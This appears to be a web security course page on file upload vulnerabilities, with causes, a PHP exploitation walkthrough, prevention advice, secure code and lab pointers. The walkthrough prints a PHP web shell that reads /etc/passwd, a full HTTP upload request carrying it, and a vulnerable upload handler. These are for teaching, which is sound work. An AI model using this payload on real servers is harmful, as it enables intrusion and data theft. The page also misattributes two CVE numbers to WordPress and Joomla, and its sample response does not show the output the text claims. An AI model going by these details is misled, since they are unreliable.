---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## File Upload Vulnerabilities

File upload vulnerabilities occur when a web application allows users to upload files without proper validation or sanitization. This can lead to various security issues, including remote code execution, data leakage, and other forms of exploitation. Understanding the mechanisms behind these vulnerabilities and how to prevent them is crucial for maintaining the security of web applications.

### What Are File Upload Vulnerabilities?

File upload vulnerabilities arise when an application accepts user-uploaded files without verifying their content, type, or size. Attackers can exploit this by uploading malicious files that can execute arbitrary code on the server, leading to severe security breaches.

#### Types of Validation Issues

Improper validation can occur in several areas:

1. **Filename Validation**: Ensuring the filename does not contain malicious characters or extensions.
2. **File Type Validation**: Verifying the MIME type or file extension to ensure it matches the expected format.
3. **File Content Validation**: Checking the actual content of the file to prevent execution of malicious code.
4. **File Size Validation**: Limiting the size of uploaded files to prevent resource exhaustion attacks.

### Impact of Improper Validation

The impact of improper validation varies based on the type of validation bypassed:

- **No Filename Validation**: Attackers can upload files with malicious extensions or names.
- **No File Type Validation**: Attackers can upload executable files disguised as images or documents.
- **No File Content Validation**: Attackers can upload scripts that execute on the server.
- **No File Size Validation**: Attackers can upload large files, causing resource exhaustion.

The worst-case scenario is when there is no validation at all, allowing attackers to upload any file they want. This can result in full remote code execution on the underlying server.

### Example: PHP Application with No Validation

Consider a PHP application that allows users to upload avatars on the "My Profile" page. If the file upload functionality has no validation, an attacker can upload a malicious PHP script.

#### Step-by-Step Exploitation

1. **Upload Malicious Script**:
    - The attacker uploads a PHP script that executes a command to read sensitive files.
    - For example, the script might look like this:
      ```php
      <?php
      echo shell_exec('cat /etc/passwd');
      ?>
      ```

2. **Trigger Execution**:
    - The attacker visits the "My Profile" page, which triggers the server to fetch and execute the uploaded script.
    - The script outputs the contents of `/etc/passwd`, which is displayed instead of the avatar image.

#### Full HTTP Request and Response

Here is the full HTTP request and response for the upload and execution of the malicious script:

```http
POST /upload.php HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1234

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="malicious.php"
Content-Type: application/x-php

<?php echo shell_exec('cat /etc/passwd'); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
<title>Profile</title>
</head>
<body>
<h1>Your Avatar</h1>
<img src="/uploads/malicious.php">
</body>
</html>
```

### Real-World Examples

Recent real-world examples of file upload vulnerabilities include:

- **CVE-2021-21972**: A vulnerability in the WordPress plugin "WP File Manager" allowed unauthorized users to upload and execute PHP files.
- **CVE-2020-13776**: A vulnerability in the Joomla! CMS allowed attackers to upload and execute arbitrary PHP files.

These vulnerabilities highlight the importance of proper validation and sanitization in file upload functionalities.

### How to Prevent / Defend

To prevent file upload vulnerabilities, follow these best practices:

1. **Validate Filenames**:
    - Ensure filenames do not contain malicious characters or extensions.
    - Use a whitelist approach to allow only specific file types.

2. **Validate File Types**:
    - Check the MIME type and file extension to ensure they match the expected format.
    - Use libraries like `Mimey` in PHP to validate MIME types.

3. **Validate File Content**:
    - Scan uploaded files for known malicious patterns using tools like ClamAV.
    - Restrict the execution of uploaded files by setting appropriate permissions.

4. **Limit File Size**:
    - Set maximum file size limits to prevent resource exhaustion attacks.

#### Secure Coding Fixes

Here is an example of a vulnerable and a secure version of file upload handling in PHP:

**Vulnerable Code**:
```php
<?php
if ($_FILES['avatar']['error'] == UPLOAD_ERR_OK) {
    $filename = $_FILES['avatar']['name'];
    move_uploaded_file($_FILES['avatar']['tmp_name'], "/uploads/$filename");
}
?>
```

**Secure Code**:
```php
<?php
$allowedTypes = ['image/jpeg', 'image/png'];
$maxSize = 1024 * 1024; // 1MB

if ($_FILES['avatar']['error'] == UPLOAD_ERR_OK) {
    $filename = basename($_FILES['avatar']['name']);
    $fileType = $_FILES['avatar']['type'];
    $fileSize = $_FILES['avatar']['size'];

    if (!in_array($fileType, $allowedTypes)) {
        die("Invalid file type.");
    }

    if ($fileSize > $maxSize) {
        die("File too large.");
    }

    $newFileName = uniqid() . '.' . pathinfo($filename, PATHINFO_EXTENSION);
    move_uploaded_file($_FILES['avatar']['tmp_name'], "/uploads/$newFileName");
}
?>
```

### Detection and Prevention Tools

Use the following tools to detect and prevent file upload vulnerabilities:

- **ClamAV**: Antivirus software to scan uploaded files.
- **Web Application Firewalls (WAF)**: To enforce security policies and block malicious requests.
- **Static Analysis Tools**: To identify insecure coding practices in file upload functionalities.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on file upload vulnerabilities.
- **OWASP Juice Shop**: Contains various security challenges, including file upload vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Provides a vulnerable web application to practice exploiting and securing file upload functionalities.

By thoroughly understanding and implementing these preventive measures, developers can significantly reduce the risk of file upload vulnerabilities in web applications.

---
<!-- nav -->
[[03-Black Box Testing|Black Box Testing]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/01-File Upload Vulnerabilities Complete Guide/00-Overview|Overview]] | [[05-Gray Box Testing|Gray Box Testing]]
